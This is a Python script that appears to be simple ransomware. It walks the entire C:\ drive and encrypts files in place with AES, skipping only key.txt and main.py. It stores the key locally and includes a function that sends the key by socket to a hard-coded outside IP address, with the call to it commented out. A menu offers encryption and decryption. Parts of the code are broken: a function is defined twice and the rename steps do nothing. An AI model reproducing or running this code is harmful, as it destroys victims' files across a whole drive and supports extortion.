import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import socket

def encrypt_aes(text, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(text.encode('utf-8'), AES.block_size))
    return cipher.iv + ciphertext

def decrypt_aes(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    ciphertext = ciphertext[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode('utf-8')

def find_files():
    file_list = []
    for root, dirs, files in os.walk("C:\\"):
        print(root)
        for file in files:
            if file == "key.txt" or file == "main.py":
                continue
            print(file)
            file_list.append(os.path.join(root, file))
    return file_list
# funciont to get a file list and incript the files using the encrypt_aes function
def encrypt_files(file_list, key):
    for file in file_list:

        try:
            with open(file, 'rb') as f:
                plaintext = f.read()
                cipher = AES.new(key, AES.MODE_CBC)
                ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

            # Rename the original file with a '.encrypted' extension
            encrypted_file = file
            os.rename(file, encrypted_file)

            # Write the encrypted data to a new file
            with open(file, 'wb') as f:
                f.write(cipher.iv + ciphertext)

            print(f"File encrypted: {file}")
        except PermissionError:
            print(f"Permission denied: {file}. Skipped.")
def decrypt_files(file_list, key):
    for file in file_list:
        try:
            with open(file, 'rb') as f:
                ciphertext = f.read()
                plaintext = decrypt_aes(ciphertext, key)

            # Write the decrypted data to a new file
            with open(file, 'wb') as f:
                f.write(plaintext)

            print(f"File decrypted: {file}")
        except PermissionError:
            print(f"Permission denied: {file}. Skipped.")

def decrypt_files(file_list, key):
    for file in file_list:
        try:
            with open(file, 'rb') as f:
                ciphertext = f.read()

            iv = ciphertext[:AES.block_size]
            ciphertext = ciphertext[AES.block_size:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

            # Rename the original file with a '.decrypted' extension
            decrypted_file = file
            os.rename(file, decrypted_file)

            # Write the decrypted data to a new file
            with open(decrypted_file, 'wb') as f:
                f.write(plaintext)

            print(f"File decrypted: {file}")
        except PermissionError:
            print(f"Permission denied: {file}. Skipped.")

def send_key_to_host(host, port, key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(key)
        print("Key sent to host")
def crp():
    key = get_random_bytes(16)  # 16 bytes (128 bits) key for AES-128
    #WRITE KEY IN THE TXT
    with open('key.txt', 'wb') as f:
        f.write(key)
    # send key to host
    #send_key_to_host(	"45.178.248.55",42424 , key)
    filelist= find_files()
    print(find_files())
    encrypt_files(filelist, key)
def dcrp():
    with open('key.txt', 'rb') as f:
        key = f.read()
    filelist = find_files()
    decrypt_files(filelist, key)
if __name__ == '__main__':
    #le input do usuario
    while True:
        print("1 - Encrypt")
        print("2 - Decrypt")
        print("3 - Exit")
        option = input("Choose an option: ")
        if option == "1":
            crp()
        elif option == "2":
            dcrp()
        elif option == "3":
            break
        else:
            print("Invalid option")
        

